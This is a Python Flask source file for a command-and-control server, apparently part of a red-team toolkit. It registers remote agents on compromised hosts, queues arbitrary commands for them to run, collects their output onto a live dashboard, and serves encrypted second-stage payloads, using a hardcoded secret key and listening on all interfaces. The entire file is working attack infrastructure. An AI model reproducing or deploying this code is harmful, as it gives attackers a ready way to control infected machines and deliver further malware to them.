import os
import sqlite3
import datetime
from pathlib import Path

from flask import Flask, request, render_template, jsonify
from flask_socketio import SocketIO, emit

# === Flask App Config ===
app = Flask(__name__)
app.config['SECRET_KEY'] = 'redops_secret'
socketio = SocketIO(app)

# === Database Path ===
project_root = Path(__file__).resolve().parent
DB_PATH = project_root / "db" / "c2.db"

# === DB Connection Helper ===
def db_conn():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# === Routes ===

# Home/Dashboard
@app.route('/')
def dashboard():
    return render_template('dashboard.html')

# Agent registration
@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    ip = request.remote_addr
    hostname = data.get('hostname')
    pid = data.get('pid')
    os_type = data.get('os')
    arch = data.get('arch')
    timestamp = datetime.datetime.utcnow().isoformat()

    conn = db_conn()
    cur = conn.cursor()
    cur.execute("INSERT INTO agents (ip, hostname, pid, os, arch, last_seen) VALUES (?, ?, ?, ?, ?, ?)",
                (ip, hostname, pid, os_type, arch, timestamp))
    agent_id = cur.lastrowid
    conn.commit()
    conn.close()

    socketio.emit("new_agent", {
        "id": agent_id,
        "ip": ip,
        "hostname": hostname,
    })

    return jsonify({'status': 'ok', 'agent_id': agent_id})

# Agent polls for task
@app.route('/task', methods=['GET'])
def get_task():
    agent_id = request.args.get("agent_id")
    conn = db_conn()
    cur = conn.cursor()
    cur.execute("SELECT id, command FROM tasks WHERE agent_id=? AND status='queued' ORDER BY id ASC LIMIT 1", (agent_id,))
    task = cur.fetchone()

    if task:
        cur.execute("UPDATE tasks SET status='sent' WHERE id=?", (task["id"],))
        conn.commit()
        conn.close()
        return jsonify({'task_id': task['id'], 'command': task['command']})
    conn.close()
    return jsonify({'task_id': None, 'command': None})

# Agent posts back result
@app.route('/result', methods=['POST'])
def post_result():
    data = request.get_json()
    task_id = data.get("task_id")
    output = data.get("output")

    conn = db_conn()
    cur = conn.cursor()
    cur.execute("UPDATE tasks SET status='completed', result=? WHERE id=?", (output, task_id))
    conn.commit()
    conn.close()

    socketio.emit("new_result", {
        "task_id": task_id,
        "output": output
    })

    return jsonify({'status': 'ok'})

# Task insertion via web form
@app.route('/add-task', methods=['POST'])
def add_task():
    data = request.get_json()
    agent_id = data.get('agent_id')
    command = data.get('command')

    conn = db_conn()
    cur = conn.cursor()
    cur.execute("INSERT INTO tasks (agent_id, command, status) VALUES (?, ?, 'queued')", (agent_id, command))
    conn.commit()
    conn.close()

    return jsonify({'status': 'ok', 'message': f'Task queued for agent {agent_id}.'})

# Serve stage2 payloads
@app.route('/stage2/<payload_id>', methods=['GET'])
def get_stage2(payload_id):
    try:
        stage_dir = project_root / "stage2_payloads"
        stage_dir.mkdir(parents=True, exist_ok=True)
        path = stage_dir / f"{payload_id}.enc"

        if not path.exists():
            return "Payload not found", 404

        return path.read_bytes()

    except Exception as e:
        return str(e), 500

# === Start Server ===
if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
